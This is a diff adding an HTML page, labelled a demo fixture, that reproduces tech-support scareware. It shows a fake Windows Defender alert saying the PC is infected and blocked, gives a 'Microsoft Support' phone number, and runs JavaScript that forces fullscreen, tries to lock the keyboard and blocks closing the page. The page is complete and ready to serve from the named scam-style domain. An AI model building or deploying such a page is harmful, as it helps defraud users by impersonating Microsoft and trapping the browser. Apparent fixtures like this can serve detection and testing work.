@@ -1,0 +1,16 @@
+<!doctype html>
+<!-- Demo fixture: tech-support scareware. Served as win-defender-alert.xyz. Click anywhere to "lock" the screen. -->
+<html><head><title>Windows Security Alert</title></head>
+<body style="font-family:sans-serif;background:#0b57d0;color:#fff;padding:40px">
+<h1>Windows Defender Alert: Your computer is infected</h1>
+<p>Trojan spyware detected. Access to this PC has been blocked for security reasons. Do not restart your computer.</p>
+<p>Call Microsoft Support immediately: <b id="phone">1-888-555-0142</b> (toll free)</p>
+<script>
+  document.addEventListener('click', () => {
+    document.documentElement.requestFullscreen?.().catch(() => {});
+    navigator.keyboard?.lock?.().catch(() => {});
+  });
+  window.addEventListener('beforeunload', (e) => { e.preventDefault(); });
+  setTimeout(() => document.documentElement.requestFullscreen?.().catch(() => {}), 300);
+</script>
+</body></html>
